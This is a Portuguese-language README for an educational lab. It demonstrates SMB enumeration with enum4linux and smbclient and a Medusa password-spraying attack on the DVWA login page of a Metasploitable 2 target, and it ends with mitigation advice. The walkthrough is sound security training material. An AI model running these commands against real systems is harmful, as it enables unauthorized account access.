# Ataque de Força Bruta com Medusa

Este projeto, com fins educacionais, demonstra a execução de técnicas de Força Bruta e Enumeração de Serviços em um ambiente controlado, utilizando ferramentas nativas do Kali Linux.

⚙️ Tecnologias e Ferramentas

**Atacante:** Kali Linux
**Sistema Alvo:** Metasploitable 2
**Aplicação Web:** DVWA (Damn Vulnerable Web Application)
**Medusa:** Ferramenta para ataques de Força Bruta.
**Enum4linux:** Enumeração de informações em sistemas utilizando o protocolo SMB.
**Smbclient:** Cliente para acessar recursos compartilhados.

# Etapas do Projeto

## 1. Enumeração
Antes do ataque de força bruta, foi realizada uma enumeração no protocolo SMB para identificar usuários e compartilhamentos disponíveis.

### Executando enumeração completa e salvando em log

$ enum4linux -a 192.168.56.101 | tee enum4_output.txt

### Verificando as permissões de acesso do diretório compartilhado

$ smbclient -L //192.168.56.101 -U msfadmin

## 2. Preparação de Wordlists
Para o ataque de Password Spraying, foram criadas listas personalizadas baseadas nos dados coletados:

### Criando lista de usuários

$ echo -e "user\nmsfadmin\nservice" > smb_users.txt

### Criando lista de potenciais senhas

$ echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt


## 3. Ataque de Força Bruta Web (HTTP-FORM)
Utilização do Medusa para testar combinações de credenciais na página de login do DVWA. O comando foi configurado para identificar a falha através da string de erro retornada pela página.

$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M http /
-m PAGE:'/dvwa/login.php' /
-m FORM:'username=USER&password=PASS&Login=Login' /
-m 'FAIL=Login failed' -t 6

Parâmetros utilizados:

-h: IP do alvo.
-U: wordlists de usuários
-P: lista de senhas.
-M http: protocolo que será atacado utilizado.
-m FORM: Define os campos de input do formulário e a mensagem de erro.
-t 6: Define o número de threads (testes simultâneos).

### Medidas de Mitigação
Com resultado deste estudo, as seguintes boas práticas são recomendadas para evitar este tipo de ataque:

* Políticas de Bloqueio: Implementar bloqueio temporário de contas após várias tentativas com falhas.
* 2FA (Segundo Fator de Autenticação): Essencial para impedir acessos mesmo com a senha correta.
* Monitoramento de Logs: Utilizar ferramentas para detectar e banir IPs que realizam múltiplas requisições de login.
* Complexidade de Senha: Exigir senhas fortes que não constem em wordlists comuns.

